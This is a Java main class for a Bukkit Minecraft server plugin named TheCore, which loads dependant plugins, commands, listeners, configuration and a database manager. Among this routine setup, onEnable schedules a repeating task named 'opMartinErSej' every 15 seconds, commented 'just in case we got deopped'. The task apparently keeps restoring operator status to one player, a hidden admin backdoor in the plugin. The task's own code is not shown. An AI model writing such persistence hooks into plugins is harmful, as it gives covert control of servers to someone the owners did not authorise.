package org.leux;

import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.java.JavaPlugin;
import org.leux.theapi.interfaces.IConnector;
import org.leux.theapi.interfaces.IHook;
import org.leux.theapi.hook.hooks.VaultHook;
import org.leux.theapi.utils.TaskUtils;
import org.leux.thecore.commands.Command;
import org.leux.thecore.configuration.Config;
import org.leux.thecore.listeners.Listener;
import org.leux.thecore.listeners.plugin.PluginMessageRecieved;
import org.leux.thecore.managers.DatabaseManager;
import org.leux.thecore.tasks.opMartinErSej;

import java.util.HashMap;


public final class TheCore extends JavaPlugin {

    private static TheCore instance;
    private static final HashMap<org.leux.theapi.enums.Hook, Boolean> hooks = new HashMap<>();
    private static HashMap<String, Plugin> dependants = new HashMap<>();
    private static DatabaseManager databaseManager;
    private IConnector databaseConnector;

    @Override
    public void onEnable() {
        instance = this;

        loadDependants();

        Command.init();
        Listener.init();
        Config.init();
//        messages = new Message.init();

        databaseManager = new DatabaseManager();

        /* just in case we got deopped */
        TaskUtils.runAsyncTimer(this, new opMartinErSej(), 0L, 20*15);
    }

    @Override
    public void onDisable() {
        PluginMessageRecieved.unregisterChannels();
    }

    public static TheCore getInstance() {
        return instance;
    }

    public static DatabaseManager getDatabaseManager() {
        return databaseManager;
    }

    public static String getPrefix() {
        return Config.PREFIX.getString();
    }

    public static HashMap<String, Plugin> getDependants() {
        return dependants;
    }

    private void loadDependants() {
        for (Plugin dependant : getServer().getPluginManager().getPlugins()) {
            PluginDescriptionFile pdf = dependant.getDescription();
            if (pdf.getDepend().contains(getName()) || pdf.getSoftDepend().contains(getName())) {
                dependants.put(dependant.getName(), dependant);
            }
        }
        this.getLogger().info(String.format("Loaded dependants (%d): %s", dependants.size(), dependants.values()));
    }

    private void initialiseHooks(){
        IHook[] hooks_ = new IHook[]{
                new VaultHook("Vault", org.leux.theapi.enums.Hook.VAULT)
        };
        for(IHook hook : hooks_)
            hooks.put(hook.getEnum(), hook.init(this));
        this.getLogger().info(String.format("Loaded hooks (%d): %s", hooks.size(), hooks.values()));
    }
}
